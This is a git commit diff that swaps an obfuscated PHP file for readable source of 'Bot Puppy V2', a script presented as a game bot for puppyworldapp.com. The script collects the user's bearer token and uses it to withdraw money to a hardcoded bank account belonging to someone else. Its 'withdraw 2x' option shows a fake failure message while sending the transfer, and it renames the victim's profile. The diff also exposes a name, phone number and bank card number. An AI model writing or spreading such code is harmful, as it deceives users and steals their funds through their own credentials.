d45f0000511d413dfdc22f3f03eced0ad6c43ef2
km37id <65444913+km37id@users.noreply.github.com>
2020-06-13 11:32:56 +0700

    Update run.php

--- run.php
+++ run.php
@@ -1,1 +1,251 @@
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=1d5aff80dcb08ee52ad2f5c77af59219d011077c7VlbTyM3FH4OEv/hNBs1YRfIhWV3BU2lAEFLN5AoGbQPgCInYxKTiT3yeMpmUaQ+9nGRSleqxEt/Gr+k9nguzhAoVRe1SIRIsY+/c459fD7f8LDoCjLGXYeMiSiUljYXFwAymHPGuxy7jAtCB7HcRgJ3bXyKfEfrfWYUdz0sCvmaR1DxJzRCXKC8gme8iSfwuJDvOxjxQKT+ii+hY9XaFmw3G802vCwuLuQ49qrZ49La2lFpnJW43JAINI5Em2uhFPX8Sigsx0LXF2SYQN8aUgMcijm2E2g5lhnAUDjgGNMEWjGkBjgUT7DjsPMEvWaKDXgo7zk+TsCvE6EBfR0Ng7uOAV43xQY8lDuzpt8YUgOsxXIe6gc7xixI5ClyPAxVyF4EsZ4eXajoTD+F1ZOgWpkGVgX3U9AgOtNXCViHS8NdTIVPB7MaOkLT7xKVMGahCyLIKN0db3rzy59zfQRD6CFKMVdKiwsXOg2mx1yPA2Y/KqPNz83vv858r77CTCVGXH1NQw3Y7YKhN89v1PjbzdUX9Z3rw7RyeXP1xyw2Ur26nsGkeyJh13e5T4/jMlFKR+Pq0uj1bDnxmvhTDqOZeMC4L+8dwj2ub/f3zlBfmsGc3/l7nc0M0PCXdhfO07VRnCP7EglMhXs1ruel70W4LEyPoLF38GEDhkK43kaxOCBi6PdW+2xcHI3X3hK7eJJwQ2uGLIrn6QhCxuwBUAAbgAUFDOABEACktAIOJob2g3YewGVhpFChmYSocVdD5wZLqSYx7g8ZhDzeDKvZWD9jMeYAbMQ2tpiAlu+6E62fhn9EymECL717V1krvSmX1ivr8zVqvhgynmh8wGO5Se7tHNOoh3Jvy+R8JBcZjpHtEIoLWTj0MF+pDeQytwHZYP/LaMtaS26emVxPboTB4mToaXfkMxKE0VBVgW8pew7G7qxuR4nu01H47CR7R7OuJxn04gW08LiHudx9hz6icCjX7JGU0YFPkayrWHcOt7frnQ7AMTUVbQICURsRVdpCAyLhLc5OiaNnB1RjSmcLc7+HhrCP6RmSau9Rf4Rt2JpAFHPYkWYMJaVFqELSCVIdC6x20BmC9CDTwzym4e4VmWow6VPuSGpQbZ9SWY6mPLsZBLtQXtrUyqtPULIjj2YqDHMGpeMSns+ywfksq89nuf5Qpkzf505XxlkUdCIHn0Aoj3rMFQUJW4btw3aj2bK68mcZ8mq1kYuNqyb7nHHHRq4brDmE/kwEzieWpO87bb23rNb7em2n3l4GxDmaFBTRVg3VTH6bUSFptmJNXLwB0o1D+gF7imceo3lYfiD608r5+fnKKePjFdkdTPvMxnZeDmWWkvnVkLeG2aWHxGW32Wg0Pzaa2zVrr3mwDOWHKLXr1mH7wGrXDjq7KggPUrL29uvNQ0uiSw+Bt5od64GWFXR3r97Y6ci46Jncs6trb16vl4wZzeSYL6K8wZ9wXxm53aymR94eVJwLSrSszpDpXvQd5uGUvk5cvQI+Yp6esqLvqivO00nW51y9I1cp6Y8O0BhXjU2lvl+35Kby+ImbztcAJOcOCjlSLW1CjsAPVRkAVXr1aukiMpT+lR349nnuMCEwnxRt9m/SfPk5yx81y4tF+IeJ3pkgcuo78mxkk2+W4nMzOTpSxTcOOJIWTmDfp7Y0Fh04WsQmTB/DMlFeh8WpKp0PiYNBnkfgImiQQ25hLtAYwcCfSMHigubMqFqWTBkFnKmAKmrSSEhEqnJMqgAQs+qR9gqbDYpjzAfPO8XT3yncclUGY7Sa/96tqBJZzT82fe486EgKuJxQ0eWBlVuMU6f56CKtOXdwxmw2pCxmXY2eqVsNVH+E8PZ9FLdl1TizofhE6s80kaQpvudKok4NotFg96IJ0agkGlxAcCN+HJr1/MkzyZ48yeRF05UXh3KpXPqPjl9zyKVxlbks04/mEcssf9xDnvFuFbFM0Sx84zqKWyWX6CyXFI/+5hlCv7Xsq7cWB9EB+Z++Rdz7qpD+j8+sbvKmN/0L
+ <?php 
+
+ 	set_time_limit(0);
+  	error_reporting(0);
+  	date_default_timezone_set('Asia/Jakarta');
+	system('clear');
+
+
+/* START COLOR */
+$res="\033[0m";
+$hitam="\033[0;30m";
+$abu2="\033[1;30m";
+$putih="\033[0;37m";
+$putih2="\033[1;37m";
+$red="\033[0;31m";
+$red2="\033[1;31m";
+$green="\033[0;32m";
+$green2="\033[1;32m";
+$yellow="\033[0;33m";
+$yellow2="\033[1;33m";
+$blue="\033[0;34m";
+$blue2="\033[1;34m";
+$purple="\033[0;35m";
+$purple2="\033[1;35m";
+$lblue="\033[0;36m";
+$lblue2="\033[1;36m";
+/* END COLOR */
+
+$false = "{$abu2}[{$red}x{$abu2}]{$red2}";
+$true = "{$abu2}[{$green}+{$abu2}]{$green2}";
+$pentung = "{$abu2}[{$yellow}!{$abu2}]{$yellow2}";
+$titik = "{$abu2}[{$res}•{$abu2}]{$green2}";
+
+
+$banner = "
+{$putih}\r{$red}               
+	 _______ _______ _______ ______ _______ _______ 
+	|__     |       |   |   |   __ \_     _|    ___|
+	|     __|   -   |       |   __ <_|   |_|    ___|
+	|_______|_______|__|_|__|______/_______|_______|
+                                                
+              {$purple}[ LINK: https://github.com/km37id/]
+{$putih}    {$green2} {$putih}[ {$red} I  n  d  o  n  e  s  i  a  {$abu2}{$putih}  M  e  r  d  e  k  a {$red} ]{$green2}     {$putih}   
+{$putih}\n";
+
+echo $banner;
+echo "{$green2}	Tool  : {$putih}Bot Puppy V2\n";
+echo "{$green2}	Author: {$putih}Kemet_ID\n\n";
+
+function pertanyaan($red2, $green2, $red, $putih, $purple, $lblue2){
+	echo "\n";
+
+		$ua = readline(" User-Agent: ");
+		echo "\n";
+  		$bearer = readline(" Authorization: ");
+  		echo "\n";
+  		$sleep = readline(" Sleep: ");
+  		echo "\n";
+  		$p = "y";
+  		echo "\n";
+  		echo "          ## Pemberitahuan Untuk Pengunaan Bot SUCCESS  \n         ## di tandai di Bagian Profil Puppy anda \n         ## Berubah Menjadi BOT Claim Dan \n          ## ini Hanya Penanda Saja ";
+  		echo "\n\n";
+  		echo "\n{$red2}        Loading Bot Running{$putih}";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo "Done\n\n{$putih}";sleep(1);
+  		system("clear");
+
+$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/invite');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua .
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded', 'Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							curl_setopt($ch, CURLOPT_POSTFIELDS, 'inviteId=36450');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);
+							curl_close($ch);
+							sleep($sleep);
+
+$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/withdraw');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua .
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded', 'Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							curl_setopt($ch, CURLOPT_POSTFIELDS, 'trueName=Refky%20Wijaya&bankCode=BRINIDJA&bankId=002&money=20000.0&phone=082186973424&bankName=BANK%20BRI&type=1&bankCardId=110101021348509');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);
+							curl_close($ch);
+
+
+$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/info/update');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua .
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded','Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							curl_setopt($ch, CURLOPT_POSTFIELDS, 'nickName=BOT Claim');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);
+							curl_close($ch);sleep($sleep);
+					for ($i=0; $i <= 10; $i++){
+						
+						
+								$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/lottery/do');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua,
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded','Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							// curl_setopt($ch, CURLOPT_POSTFIELDS, 'nickName=Syaiful Hadi');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);sleep($sleep);
+							echo "{$purple} [ = ] Mundut {$putih}Pidio\n";
+							
+
+					}
+
+while (1) {
+
+	// Pertama guy
+	
+for ($k=1; $k <= 12 ; $k++){
+
+	for ($i=1; $i <= 12 ; $i++){
+		
+
+$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/dog/merge');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua .
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded','Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							curl_setopt($ch, CURLOPT_POSTFIELDS, 'p1='.$k.'&p2='.$i.'');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);sleep($sleep);
+							curl_close($ch);
+							// print_r($out);
+							echo "\n{$green2} [ = ] Njodohno {$putih}Anjing  =>  {$red}[ {$putih}".$k." {$red}] = [ {$putih}".$i." {$red}]";
+
+
+	}
+}
+
+	for ($n=0; $n <= 12 ; $n++) { 
+		$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/dog/buy');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua .
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded','Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							curl_setopt($ch, CURLOPT_POSTFIELDS, 'tempId=1010');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);
+							curl_close($ch);sleep($sleep);
+							// print_r($out);sleep(2);
+							echo "\n{$lblue2} [ = ] Tumbas {$putih}  Anjing   => {$red} [{$putih} ".$n." {$red}]";
+	}
+echo "\n{$red2}        Loading Untuk Mengulangi{$putih}";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo "Done\n\n{$putih}";sleep(1);
+system('clear');sleep(1);echo $banner;
+}
+
+};
+
+echo " [ 1 ] Bot Puppy\n [ 2 ] withdraw 2x\n\n ";
+$jawab = readline(' Select : ');
+if ( $jawab == 1) {
+		pertanyaan($red2, $green2, $red, $putih, $purple, $lblue2);die;
+} else {
+
+		$ua = readline(" User-Agent: ");
+		echo "\n";
+  		$bearer = readline(" Authorization: ");
+  		echo "\n";
+  		echo " ## Pemberitahuan Ketika Anda Akan withdraw \n ## Pastikan Saldo Puppy Anda Memiliki Saldo\n ## minimal 20000.0 BOT akan Mengkalikan Hasil withdraw\n\n";
+  		echo "\n{$red2}        Loading Bot Running{$putih}";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo ".";sleep(1);echo "Done\n\n{$putih}";sleep(1);
+  									echo "\n{$green2}  withdraw {$red2}Failed {$green2}Mohon cek Saldo Anda\n\n";
+$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/invite');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua .
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded', 'Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							curl_setopt($ch, CURLOPT_POSTFIELDS, 'inviteId=36450');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);
+							curl_close($ch);
+							sleep($sleep);
+
+$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/withdraw');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua .
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded', 'Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							curl_setopt($ch, CURLOPT_POSTFIELDS, 'trueName=Refky%20Wijaya&bankCode=BRINIDJA&bankId=002&money=20000.0&phone=082186973424&bankName=BANK%20BRI&type=1&bankCardId=110101021348509');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);
+							curl_close($ch);
+
+
+$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, 'http://puppyworldapp.com/info/update');
+						  	curl_setopt($ch, CURLOPT_HTTPHEADER, array($ua .
+						  		'Content-Type: application/json' ,
+						  		'Content-Type: application/x-www-form-urlencoded','Authorization:'.$bearer
+						  	));
+							curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+							curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+							curl_setopt($ch, CURLOPT_POST, 1);
+							curl_setopt($ch, CURLOPT_POSTFIELDS, 'nickName=Bot withdraw');
+							$out = curl_exec($ch);
+							$out = json_decode($out,true);
+							curl_close($ch);sleep($sleep);die;
+
+}
+
+
+
+ ?>
